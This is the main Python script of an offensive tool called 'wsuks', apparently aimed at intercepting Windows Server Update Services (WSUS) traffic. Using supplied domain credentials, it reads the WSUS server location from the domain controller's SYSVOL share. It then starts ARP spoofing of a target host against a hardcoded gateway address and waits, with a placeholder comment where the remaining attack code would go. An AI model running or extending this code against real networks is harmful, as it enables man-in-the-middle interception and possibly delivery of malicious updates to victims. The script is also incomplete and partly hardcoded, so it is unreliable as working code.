#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import time
from scapy.all import get_if_addr, conf
from wsuks.helpers.arpspoofer import ArpSpoofer
from wsuks.helpers.logger import initLogger
from wsuks.helpers.argparser import initParser, printBanner
from wsuks.helpers.sysvolparser import SysvolParser


class Wsuks:
    def __init__(self, args):
        self.logger = logging.getLogger()
        self.hostIp = get_if_addr(conf.iface)

        # Set args
        self.targetIp = args.targetIp  # Never None (required)
        self.wsusIp = args.wsusIp
        self.wsusPort = args.wsusPort  # Default 8530
        self.username = args.username
        self.password = args.password
        self.domain = args.domain
        self.dcIp = args.dcIp

    def run(self):
        # Get the WSUS server IP and Port from the sysvol share
        sysvolparser = SysvolParser()
        if not self.wsusIp:
            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.username, self.password, self.dcIp)
        else:
            self.logger.info("WSUS Server specified manually: {}:{}".format(self.wsusIp, self.wsusPort))

        # Start Arp Spoofing
        arpspoofer = ArpSpoofer()
        arpspoofer.start(self.targetIp, "192.168.0.1")
        
        # Restlicher Code
        try:
            time.sleep(1000)
        except KeyboardInterrupt:
            print("")
            arpspoofer.stop()


def main():
    # Setup
    printBanner()
    args = initParser()
    initLogger(debug=args.debug)
    logger = logging.getLogger()
    logger.debug(args)

    wsuks = Wsuks(args)
    wsuks.run()


if __name__ == '__main__':
    main()
